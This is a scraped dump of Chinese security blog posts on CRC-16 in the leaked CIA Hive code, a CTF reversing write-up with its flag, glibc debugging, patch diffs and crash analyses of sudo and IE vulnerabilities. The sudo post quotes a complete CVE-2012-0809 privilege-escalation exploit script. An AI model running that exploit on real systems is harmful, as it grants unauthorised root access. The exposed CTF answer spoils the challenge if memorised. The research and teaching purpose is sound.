所以这个对系统的版本还是比较苛刻的，就写到这吧","categories":[],"tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://www.giantbranch.cn/tags/漏洞战争/"},{"name":"字符串格式化漏洞","slug":"字符串格式化漏洞","permalink":"https://www.giantbranch.cn/tags/字符串格式化漏洞/"},{"name":"OVF","slug":"OVF","permalink":"https://www.giantbranch.cn/tags/OVF/"}]},{"title":"CIA hive CRC16算法简述与C,python实现","slug":"CIA hive CRC16算法简述与C,python实现","date":"2017-11-16T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/11/16/CIA hive CRC16算法简述与C,python实现/","link":"","permalink":"https://www.giantbranch.cn/2017/11/16/CIA hive CRC16算法简述与C,python实现/","excerpt":"","text":"简介在维基解密Vault 8: Hive中泄露了Hive的git目录，可通过git checkout ./ 获得代码 在触发包中使用CRC-16/CCITT-FALSE算法（CRC16的算法还是挺多的，这个网站可以计算9种CRC-16的值，我们可以通过这个网站可确认具体的CRC16算法的类型，我便是从这个网站确认的） CRC-16/CCITT-FALSE算法步骤：首先定义了两个16大小的表，用于查表，一个用于高8位，一个用于低8位初始的CRC16_High和CRC16_Low都是0xff（这应该也是这算法称为False的原因）接下来便是对每一个字节进行循环操作 明文的高四位和CRC16_High的高四位进行异或，作为查表的索引 之后CRC16_High的低4位和CRC16_Low的高四位进行或云锁重新组成新的CRC16_High；CRC16_Low则是直接将原来的CRC16_Low左移四位即可 最后将CRC16_High和CRC16_Low分别异或查表结果即可 而对于明文低四位的操作也是跟高四位的一样 最后循环结束后，将CRC16_High跟CRC16_Low拼接起来就好了 C++实现一开始从哪里抠出来的代码要添加头文件才能运行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;uint16_t tiny_crc16(const uint8_t * msg, uint32_t sz);int main()&#123; char* msg = (char *)\"\\x01\\xc5\\x6c\\x34\\x8a\\x3f\\x75\\xc7\\xec\\xd5\\xe9\\x80\\x7d\\x88\\x6a\\x6c\\xb9\\x47\\x0e\\xb3\\x1a\\x5d\\x40\\xf6\\x61\\xc7\\x74\\x25\\x45\\xd9\\xa5\\x46\\x9e\\x12\\x7a\\x28\\x51\\xf0\\xef\\x3e\\xc5\\xd8\\xbe\\x42\\x61\\x28\\xaf\\x1a\\x6f\\xbd\\xcd\\x89\\x1a\\x0d\\x80\\x7c\\xd4\\xf4\\xa1\\x1a\\xcd\\x47\\x60\\x6b\\x59\\xdb\\x94\\xaa\\xcb\\x83\\xe8\\x90\\x5c\\xa6\\xd3\\xbd\\xce\\x82\\xd7\\x3d\\x3f\\xa5\\xc7\\x5a\"; printf(\"%x\\n\", tiny_crc16((unsigned char *)msg, 84));return 0;&#125;uint16_t tiny_crc16(const uint8_t * msg, uint32_t sz)&#123; uint32_t index; uint16_t crc; uint8_t val, t; /* * CRC16 Lookup tables (High and Low Byte) for 4 bits per iteration. */ unsigned short CRC16_LookupHigh[16] = &#123; 0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x81, 0x91, 0xA1, 0xB1, 0xC1, 0xD1, 0xE1, 0xF1 &#125;; unsigned short CRC16_LookupLow[16] = &#123; 0x00, 0x21, 0x42, 0x63, 0x84, 0xA5, 0xC6, 0xE7, 0x08, 0x29, 0x4A, 0x6B, 0x8C, 0xAD, 0xCE, 0xEF &#125;; /* * CRC16 \"Register\". This is implemented as two 8bit values */ unsigned char CRC16_High, CRC16_Low; // Initialise the CRC to 0xFFFF for the CCITT specification CRC16_High = 0xFF; CRC16_Low = 0xFF; for (index = 0; index &lt; sz; index++)&#123; val = msg[index] &gt;&gt; 4; // Step one, extract the Most significant 4 bits of the CRC register t = CRC16_High &gt;&gt; 4; // XOR in the Message Data into the extracted bits t = t ^ val; //高四位进行异或 // Shift the CRC Register left 4 bits CRC16_High = (CRC16_High &lt;&lt; 4) | (CRC16_Low &gt;&gt; 4); // high的低4位和low的高四位重新组成新的high CRC16_Low = CRC16_Low &lt;&lt; 4; //新的低四位则直接左移四位 // 根据上面高四位的异或结果进行查表 // Do the table lookups and XOR the result into the CRC Tables CRC16_High = CRC16_High ^ CRC16_LookupHigh[t]; CRC16_Low = CRC16_Low ^ CRC16_LookupLow[t]; val = msg[index] &amp; 0x0F; //取低四位 // Step one, extract the Most significant 4 bits of the CRC register t = CRC16_High &gt;&gt; 4; // XOR in the Message Data into the extracted bits t = t ^ val; // Shift the CRC Register left 4 bits CRC16_High = (CRC16_High &lt;&lt; 4) | (CRC16_Low &gt;&gt; 4); CRC16_Low = CRC16_Low &lt;&lt; 4; // 根据上面低四位的异或结果进行查表 // Do the table lookups and XOR the result into the CRC Tables CRC16_High = CRC16_High ^ CRC16_LookupHigh[t]; CRC16_Low = CRC16_Low ^ CRC16_LookupLow[t]; &#125; // 最后High左移8位跟Low进行异或 crc = CRC16_High; crc = crc &lt;&lt; 8; crc = crc ^ CRC16_Low; return crc;&#125; python实现12345678910111213141516171819202122232425262728293031323334353637383940# -*-coding:utf-8-*-# 算法：CRC-16/CCITT-FALSEdef crc16(msg): CRC16_LookupHigh = [0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x81, 0x91, 0xA1, 0xB1, 0xC1, 0xD1, 0xE1, 0xF1] CRC16_LookupLow = [0x00, 0x21, 0x42, 0x63, 0x84, 0xA5, 0xC6, 0xE7, 0x08, 0x29, 0x4A, 0x6B, 0x8C, 0xAD, 0xCE, 0xEF] CRC16_High = 0xFF CRC16_Low = 0xFF for i in xrange(0, len(msg)): # 利用高四位计算索引值 val = ord(msg[i]) &gt;&gt; 4 t = CRC16_High &gt;&gt; 4 t = t ^ val CRC16_High = ((CRC16_High &lt;&lt; 4) | (CRC16_Low &gt;&gt; 4)) &amp; 0xff CRC16_Low = (CRC16_Low &lt;&lt; 4) &amp; 0xff CRC16_High = CRC16_High ^ CRC16_LookupHigh[t]; CRC16_Low = CRC16_Low ^ CRC16_LookupLow[t]; # 利用低四位计算索引值 val = ord(msg[i]) &amp; 0xF t = CRC16_High &gt;&gt; 4; t = t ^ val; CRC16_High = ((CRC16_High &lt;&lt; 4) | (CRC16_Low &gt;&gt; 4)) &amp; 0xff CRC16_Low = (CRC16_Low &lt;&lt; 4) &amp; 0xff CRC16_High = CRC16_High ^ CRC16_LookupHigh[t]; CRC16_Low = CRC16_Low ^ CRC16_LookupLow[t]; crc = (CRC16_High &lt;&lt; 8) ^ CRC16_Low return hex(crc)print crc16(\"\\x01\\xc5\\x6c\\x34\\x8a\\x3f\\x75\\xc7\\xec\\xd5\\xe9\\x80\\x7d\\x88\\x6a\\x6c\\xb9\\x47\\x0e\\xb3\\x1a\\x5d\\x40\\xf6\\x61\\xc7\\x74\\x25\\x45\\xd9\\xa5\\x46\\x9e\\x12\\x7a\\x28\\x51\\xf0\\xef\\x3e\\xc5\\xd8\\xbe\\x42\\x61\\x28\\xaf\\x1a\\x6f\\xbd\\xcd\\x89\\x1a\\x0d\\x80\\x7c\\xd4\\xf4\\xa1\\x1a\\xcd\\x47\\x60\\x6b\\x59\\xdb\\x94\\xaa\\xcb\\x83\\xe8\\x90\\x5c\\xa6\\xd3\\xbd\\xce\\x82\\xd7\\x3d\\x3f\\xa5\\xc7\\x5a\") python 库雨村后来找到一个crc的库，kali安装有点问题，建议使用ubuntuhttps://pycrc.readthedocs.io/en/latest/usage.html 下面的示例代码那个0xffff正是CRC16_High，CRC16_Low结合起来的一个初始值 12345&gt;&gt;&gt; from PyCRC.CRCCCITT import CRCCCITT&gt;&gt;&gt; input = b'\\x05d\\x05\\xc0\\x00\\x01\\x00\\x0c'&gt;&gt;&gt; print(hex(CRCCCITT(\"FFFF\").calculate(input)))0x8d59'\\x05d\\x05\\xc0\\x00\\x01\\x00\\x0c'print(hex(CRCCCITT(\"FFFF\").calculate(input)))","categories":[],"tags":[{"name":"CIA","slug":"CIA","permalink":"https://www.giantbranch.cn/tags/CIA/"}]},{"title":"合天网安实验室CTF练习赛之RE300","slug":"heetianre300","date":"2017-11-07T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/11/07/heetianre300/","link":"","permalink":"https://www.giantbranch.cn/2017/11/07/heetianre300/","excerpt":"","text":"缘由在2016年6月的时候，我写下RE100和RE200的wp，当时刚接触逆向，硬刚，刚出了这两题，re300的linux没接触过，一开始并看不出什么，当时说暂时空着，现在要培训别人，要搞掂题目，所以重新看了下，达到有始有终。 开始吧die看一下，elf文件，ida打开并注释，关键在check函数（当然，注释过了） 12345678910111213int __cdecl main(int argc, char **argv)&#123; if ( argc &gt; 1 &amp;&amp; check(argv[1], 0) ) &#123; puts(\"Access granted\"); sub_8048538(argv[1]); &#125; else &#123; puts(\"Access denied\"); &#125; return 0;&#125; 之后进入check，里面首先是一个switch，可以看到第一个字符我们必须为i 12345case 0: if ( *argv1 == 'i' ) goto LABEL_19; result = 0; break; 而LABEL_19是递归调用 12LABEL_19: result = check(argv1 + 1, 7 * (zero + 1) % 11); 那我们就可以写代码了 12345678910111213dic = &#123;\"3\":\"n\", \"9\":\"r\", \"4\":\"d\", \"1\":\"e\", \"0\":\"i\", \"5\":\"a\", \"6\":\"g\", \"7\":\"s\"&#125;start = \"i\"startNum = 0for x in xrange(1,100): key = 7 * (startNum + 1) % 11 if key == 2 or key == 8 or key == 10: print start exit(0) start += dic[str(key)] startNum = key 运行结果： 12isengard[Finished in 0.1s] 那我们运行下程序即可 123root@giantbranch:~# ./rev300 isengardAccess grantedflag&#123;s0me7hing_S0me7hinG_t0lki3n&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://www.giantbranch.cn/tags/re/"}]},{"title":"在kali下使用gdb以源码方式调试glibc","slug":"在kali下使用gdb以源码方式调试glibc","date":"2017-11-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/11/06/在kali下使用gdb以源码方式调试glibc/","link":"","permalink":"https://www.giantbranch.cn/2017/11/06/在kali下使用gdb以源码方式调试glibc/","excerpt":"","text":"环境kali 2017.2 为什么写这篇记录其实这个主要是之前调试linux堆漏洞的时候，崩溃的定位有点困难，尤其是free的时候出错的时候，之前硬跟了free的汇编半天才找到问题，心累啊~ 步骤0x01 修改/etc/apt/sources.list，将deb-src那条记录前面的注释去掉，我的修改后如下：123456789root@kali:~# cat /etc/apt/sources.list# # deb cdrom:[Debian GNU/Linux 2017.2 _Kali-rolling_ - Official Snapshot amd64 LIVE/INSTALL Binary 20170917-01:51]/ kali-rolling contrib main non-free#deb cdrom:[Debian GNU/Linux 2017.2 _Kali-rolling_ - Official Snapshot amd64 LIVE/INSTALL Binary 20170917-01:51]/ kali-rolling contrib main non-freedeb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 之后就更新一下list吧（既然有apt就不要多个get那么麻烦了） 1apt update 0x02 安装带调试符号的libc32和64都装吧 12apt install libc6-dbg apt install libc6-dbg:i386 之后就下载源码到当前目录 1apt source libc6-dev 之后目录就出现下面几个东西，glibc-2.24就是源码目录，当然版本有可能不同 1glibc-2.24 glibc_2.24-17.debian.tar.xz glibc_2.24-17.dsc glibc_2.24.orig.tar.xz 0x03 开始调试之旅吧gdb不会自动找到源码，还需自己干 12Breakpoint 1, __GI___libc_free (mem=0x555555757460) at malloc.c:29542954 malloc.c: No such file or directory. 我们在源码目录找一下 123root@kali:~# find ./glibc-2.24/ -name malloc.c./glibc-2.24/.pc/any/cvs-malloc-hardening.diff/malloc/malloc.c./glibc-2.24/malloc/malloc.c 最后用directory命令指定一下就好了 12gdb-peda$ directory ~/glibc-2.24/malloc/Source directories searched: /root/glibc-2.24/malloc:/root/glibc-2.24/malloc/malloc.c:$cdir:$cwd 我们再ni，那就看到执行到源码的那行代码的具体内容了 10x00007f2eddb4851d 2955 if (__builtin_expect (hook != NULL, 0)) 好了，大家可以好好去玩耍了 PS：需要哪个文件的时候我们directory再指定就好了","categories":[],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://www.giantbranch.cn/tags/gdb/"},{"name":"源码调试","slug":"源码调试","permalink":"https://www.giantbranch.cn/tags/源码调试/"}]},{"title":"CVE-2012-0809-Sudo格式化字符串漏洞","slug":"CVE-2012-0809-Sudo格式化字符串漏洞","date":"2017-10-31T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/10/31/CVE-2012-0809-Sudo格式化字符串漏洞/","link":"","permalink":"https://www.giantbranch.cn/2017/10/31/CVE-2012-0809-Sudo格式化字符串漏洞/","excerpt":"","text":"简介来源：漏洞战争 sudo有漏洞是个很爽的事情，😄，这个是可以提权的~ 可通过ln等命令利用 12ln -s /usr/bin/sudo ./%s./%n -D9 在网上找到了如下exp 123456789101112131415161718192021#!/bin/bash# CVE-2012-0809 exploit # joernchen of Phenoelit's version # Payload to be executed goes to /tmp/a (might be a shell script)cd /tmp/bin/echo '-&gt; Clearing ENV'for i in `env |cut -f1 -d \"=\"` ;do unset $i;done /bin/echo '-&gt; Creating symlink'/bin/ln -s /usr/bin/sudo ./%134520134x%900\\$n/bin/echo '-&gt; Setting ENV'export AAA=AAAA;export A;for i in `/usr/bin/seq 1 5000`; do export A=$A`echo -n -e '\\x24\\x83\\x05\\x08'`;done;/bin/echo '-&gt; Now a little Brute-Force'while true ; do SUDO_ASKPASS=/tmp/a ./%134520134x%900\\$n -D9 -A id 2&gt;/dev/null ; if [[ \"$?\" == \"1\" ]]; then break ;fi ; done/bin/echo '-&gt; Cleaning up'/bin/rm /tmp/%134520134x%900\\$n 当然还有exploit-db的 https://www.exploit-db.com/exploits/25134/ 源码对比分析因为linux是开源的，这个软件也开源 看看出问题的sudo_debug函数在哪 123456$ grep \"sudo_debug(int level\" -r ././advisory_sudo.txt:sudo_debug(int level, const char *fmt, ...)./sudo-1.8.3p1/src/sudo.c:sudo_debug(int level, const char *fmt, ...)./sudo-1.8.3p1/src/sudo.h:void sudo_debug(int level, const char *format, ...) __printflike(2, 3);./sudo-1.8.3p2/src/sudo.c:sudo_debug(int level, const char *fmt, ...)./sudo-1.8.3p2/src/sudo.h:void sudo_debug(int level, const char *format, ...) __printflike(2, 3); 对比","categories":[],"tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://www.giantbranch.cn/tags/漏洞战争/"},{"name":"CVE","slug":"CVE","permalink":"https://www.giantbranch.cn/tags/CVE/"},{"name":"字符串格式化漏洞","slug":"字符串格式化漏洞","permalink":"https://www.giantbranch.cn/tags/字符串格式化漏洞/"},{"name":"sudo","slug":"sudo","permalink":"https://www.giantbranch.cn/tags/sudo/"}]},{"title":"CVE-2017-11780补丁对比","slug":"CVE-2017-11780补丁对比","date":"2017-10-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/10/19/CVE-2017-11780补丁对比/","link":"","permalink":"https://www.giantbranch.cn/2017/10/19/CVE-2017-11780补丁对比/","excerpt":"","text":"获取补丁我的电脑是 Windows 10 Version 1703 for x64-based Systems 自动更新安装的是 KB4041676，跟官方公告吻合：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11780 那我怎么获取之前的漏洞补丁呢，我尝试在卸载试试 因为比较md5不同了，应该是成功了，srv2也是修改了的 srv对比 根据这个跟四哥初步分析，漏洞应该在SrvOs2GeaListToNt 直接用ida对比看，这加法应该是一个整数溢出漏洞 后面就可以控制分配的内存 srv2对比如果ida没错的话，就修改了一个 改动很小，是置0操作 那么这应该是未初始化漏洞 因为加入我没进入if，后面就不会对v5，和v5+8复制，v5就是a2的copy 总结这次的漏洞可能是 srv的SrvOs2GeaListToNt的整数溢出srv2的Smb2ShareEnumerateSnapShots中的变量未初始化","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"补丁对比","slug":"补丁对比","permalink":"https://www.giantbranch.cn/tags/补丁对比/"}]},{"title":"驱动编程——字符串与链表","slug":"驱动编程——字符串与链表","date":"2017-10-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/10/13/驱动编程——字符串与链表/","link":"","permalink":"https://www.giantbranch.cn/2017/10/13/驱动编程——字符串与链表/","excerpt":"","text":"字符串操作字符串初始化12UNICODE_STRING str = &#123;0&#125;;RtlInitUnicodeString(&amp;str, L\"my first string\"); 字符串拷贝1234567UNICODE_STRING dst; //目标字符串WCHAR dst_buf[256]; //我们现在还不会分配内存，就定义固定长度的缓冲区吧UNICODE_STRING src = RTL_CONSTANT_STRING(L\"my first string\");// 把目标字符串初始化为拥有缓冲区长度为0的UNICODE_STRING空串RtlInitEmptyUnicodeString(&amp;dst, dst_buf, 256*sizeof(WCHAR));RtlCopyUnicodeString(&amp;dst, &amp;src); // 字符串拷贝 字符串连接12345678910111213NTSTATUS status;UNICODE_STRING dst; //目标字符串WCHAR dst_buf[256]; //我们现在还不会分配内存，就定义固定长度的缓冲区吧UNICODE_STRING src = RTL_CONSTANT_STRING(L\"my first string\");// 把目标字符串初始化为拥有缓冲区长度为256*sizeof(WCHAR)的UNICODE_STRING空串RtlInitEmptyUnicodeString(&amp;dst, dst_buf, 256*sizeof(WCHAR));RtlCopyUnicodeString(&amp;dst, &amp;src); // 字符串拷贝status = RtlAppendStringToString(&amp;dst, L\"my second string\");//如果连接两个UNICODE_STRING//The RtlAppendUnicodeStringToString routine concatenates two Unicode strings. status = RtlAppendUnicodeStringToString(&amp;dst, &amp;another); 字符串打印1234567NTSTATUS RtlStringCbPrintfW( OUT LPWSTR pszDest, IN size_t cbDest, IN LPCWSTR pszFormat, ... ); 这个需要包含头文件ntsagestr.h 123456#include &lt;ntsagestr.h&gt;............status = RtlStringCbPrintfW(dst-&gt;Buffer, 512*sizeof(WCHAR), L\"filepath = %wz file size = %d \\r\\n\",&amp;file_path, file_size);dst-&gt;Length = wcslen(dst-&gt;Buffer)*sizeof(WCHAR); 内存与链表内存的分配与释放1234567891011121314151617NTSTATUS status;#define MEM_TAG 'MyTt'// 目标字符串，接下来为它分配空间UNICODE_STRING dst; UNICODE_STRING src = RTL_CONSTANT_STRING(L\"my first string\");dst.Buffer = (PWCHAR)ExAllocatePoolWithTag(NonPagedPool, src.Length, MEM_TAG);if (dst.Buffer == NULL)&#123; /* 错误处理 */ status = STATUS_INSUFFICIENT_RESOURCES;&#125;dst.Length = dst.MaximumLength = src.Length;RtlCopyUnicodeString(&amp;dst, &amp;src);ExFreePool(dst.Buffer);dst.Buffer = NULL;dst.Length = dst.MaximumLength = 0; 使用LIST_ENTRY使用长长整形数据123456789101112131415#if defined(MIDL_PASS)typedef struct _LARGE_INTEGER &#123;#else // MIDL_PASStypedef union _LARGE_INTEGER &#123; struct &#123; DWORD LowPart; LONG HighPart; &#125;; struct &#123; DWORD LowPart; LONG HighPart; &#125; u;#endif //MIDL_PASS LONGLONG QuadPart;&#125; LARGE_INTEGER; 自旋锁初始化 12KSPIN_ my_Spin_Lock; KeInitializeSpinLock(&amp;my_Spin_Lock); 使用 1234567891011void MySafeFunction() &#123; KSPIN_LOCK my_spin_lock; KIRQL irql; KeInitialiezeSpinLock(&amp;my_spin_lock); KeAccquireSpinLock(&amp;my_spin_lock, &amp;irql); //----do something KeReleaseSpinLock(&amp;my_spin_lock, &amp;irql); &#125;","categories":[],"tags":[{"name":"驱动","slug":"驱动","permalink":"https://www.giantbranch.cn/tags/驱动/"}]},{"title":"CVE-2013-2551-Microsoft Internet Explorer COALineDashStyleArray 整数溢出漏洞","slug":"CVE-2013-2551-Microsoft Internet Explorer COALineDashStyleArray 整数溢出漏洞","date":"2017-10-12T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/10/12/CVE-2013-2551-Microsoft Internet Explorer COALineDashStyleArray 整数溢出漏洞/","link":"","permalink":"https://www.giantbranch.cn/2017/10/12/CVE-2013-2551-Microsoft Internet Explorer COALineDashStyleArray 整数溢出漏洞/","excerpt":"","text":"简介Pwn2Own 2013的漏洞，发过安全团队VUPEN他们是攻击win8的ie10，利用rop和模块基址泄露实现任意代码执行 环境及工具 Windows 7vm 12windbgida 基于类函数定位的漏洞分析方法这个poc还是比较长的，就不贴出来了，长了之后也对漏洞分析增加了不少难度（需要的下载漏洞战争的资料就好了） 在开启了hpa的情况下，崩溃信息如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162630:005&gt; g(f10.d54): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=1d04f064 ebx=68b54964 ecx=00000001 edx=00000000 esi=1d04f060 edi=0468bc14eip=76529966 esp=0468bbd0 ebp=0468bbd8 iopl=0 nv up ei ng nz ac pe cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010297msvcrt!memcpy+0x158:76529966 8b448efc mov eax,dword ptr [esi+ecx*4-4] ds:0023:1d04f060=????????0:005&gt; kvChildEBP RetAddr Args to Child 0468bbd8 68afcfa9 0468bc14 1d04f060 00000004 msvcrt!memcpy+0x1580468bbec 68b4da0f 1dae2fe8 0468bc14 00000044 vgx!ORG::Get+0x27 (FPO: [Non-Fpo])0468bc18 759d3ec3 1dae2fe8 00000044 0468bc7c vgx!COALineDashStyleArray::get_item+0x8c (FPO: [Non-Fpo])0468bc38 759d3d3d 1dceaff0 00000024 00000004 OLEAUT32!DispCallFunc+0x1650468bcc8 68b347c1 07ea3454 1dceaff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f (FPO: [Non-Fpo])0468be54 68b54a88 1dceaff4 1dceaff0 68b7223c vgx!COADispatch::Invoke+0x89 (FPO: [Non-Fpo])0468be88 6868db38 1dceaff0 00000000 68680adc vgx!COADispatchImpl&lt;IVgDashStyleArray,&amp;IID_IVgDashStyleArray,COAShapeProg&gt;::Invoke+0x2f (FPO: [Non-Fpo])0468bec8 6868da8c 006e2d10 00000000 00000409 jscript!IDispatchInvoke2+0xf00468bf04 6868d9ff 006e2d10 00000409 00000003 jscript!IDispatchInvoke+0x6a0468bfc4 6868db8a 006e2d10 00000000 00000003 jscript!InvokeDispatch+0xa90468bff0 6868d8c8 006e2d10 0468c024 00000003 jscript!VAR::InvokeByName+0x930468c03c 6868d96f 006e2d10 00000003 0468c1bc jscript!VAR::InvokeDispName+0x7d0468c068 686851b6 006e2d10 00000000 00000003 jscript!VAR::InvokeByDispID+0xce0468c204 68685c9d 0468c21c 0468c360 07fd8f88 jscript!CScriptRuntime::Run+0x2a970468c2ec 68685bfb 0468c360 00000000 07fd4f30 jscript!ScrFncObj::CallWithFrameOnStack+0xce0468c334 68685e11 0468c360 00000000 07fd4f30 jscript!ScrFncObj::Call+0x8d0468c3b0 6867f3ee 07fd8f88 0468e7a8 00000000 jscript!CSession::Execute+0x15f0468c498 6867ea2e 00000000 00000001 0468c5e8 jscript!NameTbl::InvokeDef+0x1b50468c51c 6867a22a 07fd8f88 00000000 00000001 jscript!NameTbl::InvokeEx+0x12c0468c558 6867a175 006e2d10 00000000 00000001 jscript!IDispatchExInvokeEx2+0x1040468c594 6867f5f8 006e2d10 00000001 00000001 jscript!IDispatchExInvokeEx+0x6a0468c624 672a19cb 0468c5e8 00000004 00000001 jscript!NameTbl::InvokeEx+0x37a0468c65c 6729f451 0894efb0 00000001 00000001 mshtml!CScriptCollection::InvokeEx+0x8a0468e6d0 67243148 0769ceb8 00002713 00000001 mshtml!CWindow::InvokeEx+0x6ad0468e6f8 67243104 0769ceb8 00002713 00000001 mshtml!CBase::VersionedInvokeEx+0x200468e748 6729f4eb 1ada2fd8 00002713 00000001 mshtml!PlainInvokeEx+0xeb0468e7b8 67292604 0769efa0 00002713 00000001 mshtml!COmWindowProxy::InvokeEx+0x3390468e7e0 67243148 0769efa0 00002713 00000001 mshtml!COmWindowProxy::subInvokeEx+0x260468e808 67243104 0769efa0 00002713 00000001 mshtml!CBase::VersionedInvokeEx+0x200468e85c 6867a22a 086e7fd8 00002713 00000001 mshtml!PlainInvokeEx+0xeb0468e898 6867a175 006e2d10 00002713 00000409 jscript!IDispatchExInvokeEx2+0x1040468e8d4 6867a3f6 006e2d10 00000409 00000001 jscript!IDispatchExInvokeEx+0x6a0468e994 686bd08b 00002713 00000001 00000000 jscript!InvokeDispatchEx+0x980468e9c4 6868e3e7 006e2d10 00000000 00000001 jscript!VAR::InvokeByDispID+0x1570468eb60 68685c9d 0468eb78 0468ecbc 08a64f88 jscript!CScriptRuntime::Run+0x2b800468ec48 68685bfb 0468ecbc 00000000 07fd4fd0 jscript!ScrFncObj::CallWithFrameOnStack+0xce0468ec90 68685e11 0468ecbc 00000000 07fd4fd0 jscript!ScrFncObj::Call+0x8d0468ed0c 6867f3ee 08a64f88 0468ef50 00000000 jscript!CSession::Execute+0x15f0468edf4 6867ea2e 00000000 00000001 0468eeac jscript!NameTbl::InvokeDef+0x1b50468ee78 672b7af1 08a64f88 00000000 00000804 jscript!NameTbl::InvokeEx+0x12c0468eec8 672b7b91 092caf88 08a64f88 00000000 mshtml!CBase::InvokeDispatchWithThis+0x1e10468eff4 6722a932 fffffda8 80011778 1afb6fd8 mshtml!CBase::InvokeEvent+0x2140468f154 67274dac 092caf88 075f2680 092caf88 mshtml!CBase::FireEvent+0xe10468f1cc 67274bdb 092caf88 08990fb0 00000000 mshtml!CElement::BubbleEventHelper+0x2d90468f334 670a0d11 6721d0f4 00000001 08990fb0 mshtml!CElement::FireEvent+0x2d10468f354 670a0dc4 08990fb0 00000000 0468f428 mshtml!CElement::Fire_onclick+0x1c0468f390 67479cb0 0468f4a8 08990fb0 00000000 mshtml!CElement::DoClick+0x960468f3b8 670a1415 0468f4a8 08990fb0 00000000 mshtml!CInput::DoClick+0x3f0468f454 6728d380 0468f4a8 09834fb0 00000000 mshtml!CDoc::PumpMessage+0xf180468f5cc 670a1bd7 00000202 00000000 001c0056 mshtml!CDoc::OnMouseMessage+0x55f0468f6f8 672169de 075f2680 00000202 00000000 mshtml!CDoc::OnWindowMessage+0xa3e0468f724 766886ef 000401b6 00000202 00000000 mshtml!CServer::WndProc+0x78 可以看到是vgx!ORG::Get里面调用了memcpy出的异常 看看崩溃前的memcpy的参数 1234567891011121314150:005&gt; peax=1cd3b060 ebx=68be4964 ecx=1d7cefe8 edx=0450bce4 esi=1d9d6ff0 edi=0450c28ceip=68b8cfa4 esp=0450bcb0 ebp=0450bcbc iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206vgx!ORG::Get+0x22:68b8cfa4 e800a5ffff call vgx!memcpy (68b874a9)0:005&gt; dd esp0450bcb0 0450bce4 1cd3b060 00000004 0450bce80450bcc0 68bdda0f 1d7cefe8 0450bce4 000000440450bcd0 07c8ce70 00000000 68c0223c 1d7c6f280450bce0 00000000 00000000 0450bd08 759d3ec30450bcf0 1d7cefe8 00000044 0450bd4c 07be2f240450bd00 051d1754 0450bcfc 0450bd98 759d3d3d0450bd10 1d9d6ff0 00000024 00000004 0000000a0450bd20 00000002 07be2f94 07be2f84 0450c28c 复制的大小为4，不是问题所在，先看看报错的复制的源地址1cd3b060 123456789101112131415161718192021222324252627282930313233343536370:005&gt; !heap -p -a 1cd3b060 address 1cd3b060 found in _DPH_HEAP_ROOT @ 1711000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 1ccc1548: 1cd3af50 b0 - 1cd3a000 2000 6ef28e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77634ea6 ntdll!RtlDebugAllocateHeap+0x00000030 775f7d96 ntdll!RtlpAllocateHeap+0x000000c4 775c34ca ntdll!RtlAllocateHeap+0x0000023a 76529d45 msvcrt!malloc+0x0000008d 68b856a5 vgx!GelHost::FAllocMemCore+0x0000000e 68bcc488 vgx!MsoFResizePx+0x00000069 68bcc60d vgx!MsoFGrowPx+0x00000018 68b8d047 vgx!ORG::FAppendRange+0x00000039 68bfa164 vgx!VGPIE5array::FAddElement+0x00000042 68bfa1de vgx!VGPIE5DwordArray::Text+0x00000060 68bcceb7 vgx!GetArrayVal+0x00000086 68bcd435 vgx!ParseDashStyle+0x00000021 68bcd475 vgx!CVMLShape::ParseDashStyleAttr+0x0000001a 68bdd759 vgx!COALineDashStyle::put_value+0x00000072 759d3ec3 OLEAUT32!DispCallFunc+0x00000165 759d3d3d OLEAUT32!CTypeInfo2::Invoke+0x0000023f 68bc47c1 vgx!COADispatch::Invoke+0x00000089 68be493a vgx!COADispatchImpl&lt;IVgLineDashStyle,&amp;IID_IVgLineDashStyle,COAShapeProg&gt;::Invoke+0x0000002f 759dc0b8 OLEAUT32!CTypeInfo2::Invoke+0x000005a2 68bc47c1 vgx!COADispatch::Invoke+0x00000089 68be304a vgx!COADispatchImpl&lt;IVgStroke,&amp;IID_IVgStroke,COAShapeProg&gt;::Invoke+0x0000002f 665a9884 mshtml!InvokeDispatchWithNoThis+0x00000074 6659f7a7 mshtml!CPeerHolder::InvokeExSingle+0x000000e4 6659f6d8 mshtml!CPeerHolder::InvokeExMulti+0x00000139 6659f641 mshtml!CElement::ContextInvokeEx+0x00000064 6659c79a mshtml!CInput::VersionedInvokeEx+0x0000002d 66543104 mshtml!PlainInvokeEx+0x000000eb 6881a22a jscript!IDispatchExInvokeEx2+0x00000104 6881a175 jscript!IDispatchExInvokeEx+0x0000006a 6881a3f6 jscript!InvokeDispatchEx+0x00000098 6881a4a0 jscript!VAR::InvokeByName+0x00000139 可以看到这个地址已经超过了堆的空间 